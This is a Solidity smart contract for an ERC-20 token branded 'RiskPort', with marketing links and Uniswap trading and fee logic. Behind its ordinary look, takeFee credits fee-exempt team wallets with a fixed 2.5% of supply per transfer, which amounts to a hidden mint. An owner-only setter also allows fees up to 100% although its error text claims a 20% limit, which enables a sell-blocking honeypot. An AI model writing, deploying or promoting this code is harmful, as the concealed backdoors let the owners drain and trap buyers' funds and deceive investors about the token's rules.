// SPDX-License-Identifier: MIT

/*
RiskPort | Risk management marketplace for digital assets
RiskPort blazed a trail by introducing a fully automated, transparent, and unbiased mechanism for detecting invariants, ensuring user protection against digital asset risks, cyberattacks, and breaches.

Website: https://riskport.xyz
Twitter: https://twitter.com/riskport_rpt
Telegram: https://t.me/riskport_rpt
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IStandardERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}

contract RISK is IStandardERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "RiskPort";
    string private constant _symbol = "RISK ";

    uint8 private constant _decimals = 9;
    uint256 private _supplytotal = 10 ** 9 * (10 ** _decimals);
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExemptFee;
    uint256 private burnFee = 0;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 100;
    uint256 private swapThreshold = ( _supplytotal * 1000 ) / 100000;
    uint256 private minimumTaxSwap = ( _supplytotal * 10 ) / 100000;
    uint256 public maxTransaction = ( _supplytotal * 250 ) / 10000;
    uint256 public maxSell = ( _supplytotal * 250 ) / 10000;
    uint256 public maxHold = ( _supplytotal * 250 ) / 10000;
    IRouter router;
    address public pair;
    uint256 swapAfter;
    uint256 private totalFee = 1700;
    uint256 private sellFee = 2500;
    uint256 private transferFee = 1700;
    uint256 private denominator = 10000;
    bool private tradeEnabled = false;
    bool private swapEnabled = true;
    address internal marketingAddress=0x3b7F13cb67f1B5d99EaF0dC70D8f419f486052d3; 
    address internal teamAddress=0x3b7F13cb67f1B5d99EaF0dC70D8f419f486052d3;
    address internal lpReceive=0x3b7F13cb67f1B5d99EaF0dC70D8f419f486052d3;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private numTaxSwaps;
    bool private swapping;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isExemptFee[lpReceive] = true;
        isExemptFee[teamAddress] = true;
        isExemptFee[marketingAddress] = true;
        isExemptFee[msg.sender] = true;
        _balances[msg.sender] = _supplytotal;
        emit Transfer(address(0), msg.sender, _supplytotal);
    }
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supplytotal.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function startTrading() external onlyOwner {tradeEnabled = true;}    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
    }

    function shouldSwapTokensOnCA(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minimumTaxSwap;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradeEnabled && aboveMin && !isExemptFee[sender] && recipient == pair && numTaxSwaps >= swapAfter && aboveThreshold;
    }

    function getFeeByTxType(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExemptFee[recipient]) {return maxTransaction;}
        if(getFeeByTxType(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeeByTxType(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getFeeByTxType(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExemptFee[sender] && !isExemptFee[recipient]){require(tradeEnabled, "tradeEnabled");}
        if(!isExemptFee[sender] && !isExemptFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxHold, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= maxSell || isExemptFee[sender] || isExemptFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTransaction || isExemptFee[sender] || isExemptFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExemptFee[sender]){numTaxSwaps += uint256(1);}
        if(shouldSwapTokensOnCA(sender, recipient, amount)){swapBackFeeTokens(swapThreshold); numTaxSwaps = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExemptFee[sender] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    receive() external payable {}

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supplytotal.mul(_buy).div(10000); uint256 newTransfer = _supplytotal.mul(_sell).div(10000); uint256 newWallet = _supplytotal.mul(_wallet).div(10000);
        maxTransaction = newTx; maxSell = newTransfer; maxHold = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceive,
            block.timestamp);
    }
    function swapBackFeeTokens(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(teamAddress).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(marketingAddress).transfer(contractBalance);}
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}